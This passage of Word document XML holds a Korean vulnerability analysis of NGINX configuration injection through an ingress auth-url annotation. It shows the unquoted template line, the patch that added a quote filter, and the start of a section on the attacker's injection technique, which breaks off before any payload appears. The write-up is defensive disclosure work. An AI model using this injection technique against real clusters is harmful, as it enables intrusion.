        <w:t>않은</w:t>
      </w:r>
      <w:r w:rsidRPr="00F9143F">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve"> NGINX </w:t>
      </w:r>
      <w:r w:rsidRPr="00F9143F">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:hint="eastAsia"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>설정을</w:t>
      </w:r>
      <w:r w:rsidRPr="00F9143F">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="00F9143F">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:hint="eastAsia"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>주입할</w:t>
      </w:r>
      <w:r w:rsidRPr="00F9143F">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="00F9143F">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:hint="eastAsia"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>수</w:t>
      </w:r>
      <w:r w:rsidRPr="00F9143F">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="00F9143F">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:hint="eastAsia"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>있습니다</w:t>
      </w:r>
      <w:r w:rsidRPr="00F9143F">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4DE4938B" w14:textId="77777777" w:rsidR="00F9143F" w:rsidRDefault="00F9143F" w:rsidP="00F9143F">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00F9143F">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:hint="eastAsia"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>실제</w:t>
      </w:r>
      <w:r w:rsidRPr="00F9143F">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="00F9143F">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:hint="eastAsia"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>취약한</w:t>
      </w:r>
      <w:r w:rsidRPr="00F9143F">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="00F9143F">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:hint="eastAsia"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>템플릿</w:t>
      </w:r>
      <w:r w:rsidRPr="00F9143F">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="00F9143F">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:hint="eastAsia"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>코드는</w:t>
      </w:r>
      <w:r w:rsidRPr="00F9143F">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="00F9143F">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:hint="eastAsia"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>다음과</w:t>
      </w:r>
      <w:r w:rsidRPr="00F9143F">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="00F9143F">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:hint="eastAsia"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>같습니다</w:t>
      </w:r>
      <w:r w:rsidRPr="00F9143F">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="478BD457" w14:textId="1106D68A" w:rsidR="00F9143F" w:rsidRPr="00F9143F" w:rsidRDefault="00F9143F" w:rsidP="00F9143F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mc:AlternateContent>
          <mc:Choice Requires="wps">
            <w:drawing>
              <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="4E613616" wp14:editId="0264CE8D">
                <wp:extent cx="5324475" cy="771525"/>
                <wp:effectExtent l="0" t="0" r="28575" b="28575"/>
                <wp:docPr id="93628873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77152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70A07" w14:textId="7A3E2C8F" w:rsidR="00F9143F" w:rsidRPr="001D6E9D" w:rsidRDefault="00F9143F" w:rsidP="00F9143F">
                            <w:pPr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text</w:t>
                            </w:r>
                          </w:p>
                          <w:p w14:paraId="33D86E28" w14:textId="09D2D39F" w:rsidR="00F9143F" w:rsidRPr="001D6E9D" w:rsidRDefault="00F9143F" w:rsidP="00F9143F">
                            <w:pP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</w:pPr>
                            <w:r w:rsidRPr="00F9143F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set $target </w:t>
                            </w:r>
                            <w:proofErr w:type="gramStart"/>
                            <w:r w:rsidRPr="00F9143F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{{ $externalAuth.URL }};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613616" id="직사각형 1" o:spid="_x0000_s1026" style="width:419.25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" fillcolor="white [3201]" strokecolor="black [3200]" strokeweight="1pt">
                <v:textbox>
                  <w:txbxContent>
                    <w:p w14:paraId="09C70A07" w14:textId="7A3E2C8F" w:rsidR="00F9143F" w:rsidRPr="001D6E9D" w:rsidRDefault="00F9143F" w:rsidP="00F9143F">
                      <w:pPr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text</w:t>
                      </w:r>
                    </w:p>
                    <w:p w14:paraId="33D86E28" w14:textId="09D2D39F" w:rsidR="00F9143F" w:rsidRPr="001D6E9D" w:rsidRDefault="00F9143F" w:rsidP="00F9143F">
                      <w:pPr>
                        <w:rPr>
                          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
                          <w:lang w:eastAsia="ko-KR"/>
                        </w:rPr>
                      </w:pPr>
                      <w:r w:rsidRPr="00F9143F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set $target </w:t>
                      </w:r>
                      <w:proofErr w:type="gramStart"/>
                      <w:r w:rsidRPr="00F9143F">
                        <w:rPr>
                          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
                          <w:lang w:eastAsia="ko-KR"/>
                        </w:rPr>
                        <w:t>{{ $externalAuth.URL }};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</w:p>
    <w:p w14:paraId="39123B9C" w14:textId="29DF6645" w:rsidR="00F9143F" w:rsidRPr="00F9143F" w:rsidRDefault="00F9143F" w:rsidP="00F9143F">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00F9143F">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:hint="eastAsia"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>여기서</w:t>
      </w:r>
      <w:r w:rsidRPr="00F9143F">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="00F9143F">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:b/>
          <w:bCs/>
          <w:i/>
          <w:iCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>$externalAuth.URL</w:t>
      </w:r>
      <w:r w:rsidRPr="00F9143F">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:hint="eastAsia"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>은</w:t>
      </w:r>
      <w:r w:rsidRPr="00F9143F">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="00F9143F">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:b/>
          <w:bCs/>
          <w:i/>
          <w:iCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>auth-url</w:t>
      </w:r>
      <w:r w:rsidRPr="00F9143F">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve"> annotation </w:t>
      </w:r>
      <w:r w:rsidRPr="00F9143F">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:hint="eastAsia"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>값이</w:t>
      </w:r>
      <w:r w:rsidRPr="00F9143F">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="00F9143F">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:hint="eastAsia"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>그대로</w:t>
      </w:r>
      <w:r w:rsidRPr="00F9143F">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="00F9143F">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:hint="eastAsia"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>들어가며</w:t>
      </w:r>
      <w:r w:rsidRPr="00F9143F">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:r w:rsidRPr="00F9143F">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:hint="eastAsia"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>적절한</w:t>
      </w:r>
      <w:r w:rsidRPr="00F9143F">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve"> quoting</w:t>
      </w:r>
      <w:r w:rsidRPr="00F9143F">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:hint="eastAsia"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>이나</w:t>
      </w:r>
      <w:r w:rsidRPr="00F9143F">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="00F9143F">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:hint="eastAsia"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>필터링이</w:t>
      </w:r>
      <w:r w:rsidRPr="00F9143F">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="00F9143F">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:hint="eastAsia"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>없었습니다</w:t>
      </w:r>
      <w:r w:rsidRPr="00F9143F">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2D578476" w14:textId="77777777" w:rsidR="00F9143F" w:rsidRDefault="00F9143F" w:rsidP="00F9143F">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00F9143F">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:hint="eastAsia"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>패치에서는</w:t>
      </w:r>
      <w:r w:rsidRPr="00F9143F">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:b/>
          <w:bCs/>
          <w:i/>
          <w:iCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve"> | quote</w:t>
      </w:r>
      <w:r w:rsidRPr="00F9143F">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="00F9143F">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:hint="eastAsia"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>필터를</w:t>
      </w:r>
      <w:r w:rsidRPr="00F9143F">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="00F9143F">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:hint="eastAsia"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>추가해</w:t>
      </w:r>
      <w:r w:rsidRPr="00F9143F">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="00F9143F">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:hint="eastAsia"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>입력값을</w:t>
      </w:r>
      <w:r w:rsidRPr="00F9143F">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="00F9143F">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:hint="eastAsia"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>안전하게</w:t>
      </w:r>
      <w:r w:rsidRPr="00F9143F">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="00F9143F">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:hint="eastAsia"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>처리하도록</w:t>
      </w:r>
      <w:r w:rsidRPr="00F9143F">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="00F9143F">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:hint="eastAsia"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>수정되었습니다</w:t>
      </w:r>
      <w:r w:rsidRPr="00F9143F">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1D49CA17" w14:textId="780D3281" w:rsidR="00BC09C2" w:rsidRPr="00C76F4F" w:rsidRDefault="00BC09C2" w:rsidP="00F9143F">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕" w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00BC09C2">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve">4.2 </w:t>
      </w:r>
      <w:r w:rsidR="00C76F4F" w:rsidRPr="00C76F4F">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕" w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>공격자가</w:t>
      </w:r>
      <w:r w:rsidR="00C76F4F" w:rsidRPr="00C76F4F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6F4F" w:rsidRPr="00C76F4F">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕" w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>악용할</w:t>
      </w:r>
      <w:r w:rsidR="00C76F4F" w:rsidRPr="00C76F4F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6F4F" w:rsidRPr="00C76F4F">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕" w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>수</w:t>
      </w:r>
      <w:r w:rsidR="00C76F4F" w:rsidRPr="00C76F4F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6F4F" w:rsidRPr="00C76F4F">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕" w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>있는</w:t>
      </w:r>
      <w:r w:rsidR="00C76F4F" w:rsidRPr="00C76F4F">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve"> NGINX directive injection </w:t>
      </w:r>
      <w:r w:rsidR="00C76F4F" w:rsidRPr="00C76F4F">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕" w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>기법</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1C9A4C7E" w14:textId="77777777" w:rsidR="00F9143F" w:rsidRPr="00F9143F" w:rsidRDefault="00F9143F" w:rsidP="00F9143F">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00F9143F">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕" w:hint="eastAsia"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>공격자는</w:t>
      </w:r>
      <w:r w:rsidRPr="00F9143F">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve"> auth-url annotation</w:t>
      </w:r>
      <w:r w:rsidRPr="00F9143F">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕" w:hint="eastAsia"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>에</w:t>
      </w:r>
      <w:r w:rsidRPr="00F9143F">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="00F9143F">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕" w:hint="eastAsia"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>악의적인</w:t>
      </w:r>
      <w:r w:rsidRPr="00F9143F">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="00F9143F">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕" w:hint="eastAsia"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>값을</w:t>
      </w:r>
      <w:r w:rsidRPr="00F9143F">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="00F9143F">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕" w:hint="eastAsia"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>삽입해</w:t>
      </w:r>
      <w:r w:rsidRPr="00F9143F">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:r w:rsidRPr="00F9143F">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕" w:hint="eastAsia"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>설정</w:t>
      </w:r>
      <w:r w:rsidRPr="00F9143F">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="00F9143F">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕" w:hint="eastAsia"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>파일</w:t>
      </w:r>
      <w:r w:rsidRPr="00F9143F">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="00F9143F">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕" w:hint="eastAsia"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>내에서</w:t>
      </w:r>
      <w:r w:rsidRPr="00F9143F">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="00F9143F">
        <w:rPr>
